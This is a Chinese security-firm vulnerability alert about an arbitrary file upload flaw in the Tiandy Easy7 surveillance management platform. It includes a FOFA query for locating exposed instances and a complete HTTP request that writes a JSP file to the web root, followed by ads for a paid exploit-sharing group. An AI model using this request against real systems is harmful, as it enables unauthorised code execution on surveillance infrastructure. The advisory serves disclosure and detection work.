#  【漏洞预警】天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞  
by 融云安全-sm
                    by 融云安全-sm  融云攻防实验室   2026-03-05 09:03  
  
**0x01 阅读须知**  
  
**融云安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！**  
  
**0x02 漏洞描述**  
  
天地伟业Easy7综合管理平台是专为大规模、跨区域安防监控设计的软件系统，它通过整合传感器、网络通讯、智能分析、云计算等技术，实现多系统间大容量音视频数据的交互与管理，广泛应用于智慧城市、公共安全及企事业单位的智能安防场景。‌‌  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrgUvHZ2VZwjAoYORMXYBKcL5N4NpdWTRvnYp1qObNvlnrtIWyT66sqZryL2h1oAzHIhlUmJEJ5jScrEE0JHWk09PIVl0wlVs30/640?wx_fmt=png&from=appmsg "")  
  
**0x03 漏洞复现**  
  
f  
ofa  
：  
  
body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"  
  
1.上传文件到x.jsp,访问  
/Easy7/x.jsp  
得到结果  
```
POST /Easy7/rest/file/uploadMapServerBgImage HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Connection: close
Content-Length: 280
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Accept-Encoding: gzip

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadParams"

[{"path": "/", "name": "x.jsp"}]
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.png"
Content-Type: image/png

1111111111111111111
------WebKitFormBoundary--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrjRB1GYg4DMvRyy6DSiccr9ut1VGwsnG0Jn1y838SB4XPzyCUNibuRxwMmEcmicWl5fxvYcEXnzUSUiavkX0vmG4Pib5tW91vGlGOl4/640?wx_fmt=png&from=appmsg "")  
  
2.渝融云NTM入侵检测系统已支持  
天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞  
检测  
（入侵检测合作可私聊公众号）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zriak1ich5TzmndhocarGBAK8OXfAE7TlPibWUe4a6cr50teOKjmRMDvlhibOUCfPQ4o9mbggiaN0u9T1ZfooFhNCYRNLM6l3Qvzmg5Y/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrhsLfmewqbxCCibypRaeMG3yMjzmD4rjTfib7h6nkZrx9B1hshXm2MfACh8gvvaI55mXU3Ny7voCibIicql6uxXzWynZmyN8uBZAcs/640?wx_fmt=png&from=appmsg "")  
  
3.nuclei图形化检测工具和poc已公布在星球  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zriacTibZXzL4UZuoicsmB0r2FkiatoLbDyAlMcreib0Hnuhbvicjxy6gY8tTl7iaHreuROpjBSaSiaGDgsUnwxvdwlViaz0xsuulhxmwaAI/640?wx_fmt=png&from=appmsg "")  
  
**最后给兄弟们推荐下圈子，高质量漏洞利用研究，代码审计圈子，每周至少更新三个0Day/Nday及对应漏洞的批量利用工具，团队内部POC，源码分享，星球不定时更新内外网攻防渗透技巧以及最新学习，SRC研究报告等。**  
  
**【圈子权益】**  
  
**1，一年至少200+漏洞Poc及对应漏洞批量利用工具**  
  
**2，各种漏洞利用工具及后续更新，渗透工具、文档资源分享**  
  
**3，内部漏洞库情报分享（目前已有1000+poc，会每日更新，包括部分未公开0/1day）**  
  
**圈子目前价格为59元，现在星球有1000+位师傅相信并选择加入我们**  
  
****  
****  
**0x05 公司简介**  
  
江西渝融云安全科技有限公司，2017年发展至今，已成为了一家集云安全、物联网安全、数据安全、等保建设、风险评估、信息技术应用创新及网络安全人才培训为一体的本地化高科技公司，是江西省信息安全产业链企业和江西省政府部门重点行业网络安全事件应急响应队伍成员。  
  
   公司现已获得信息安全集成三级、信息系统安全运维三级、风险评估三级等多项资质认证，拥有软件著作权十八项；荣获2020年全国工控安全深度行安全攻防对抗赛三等奖；庆祝建党100周年活动信息安全应急保障优秀案例等荣誉......  
****  
  
广告：  
CNNVD二级和三级申请、续期私聊找我对话，价格便宜童叟无欺！  
  
**编制：sm**  
  
**审核：fjh**  
  
**审核：Dog**  
  
****  
**1个1朵********5毛钱**  
  
**天天搬砖的小M**  
  
**能不能吃顿好的**  
  
**就看你们的啦**  
  
****  
  
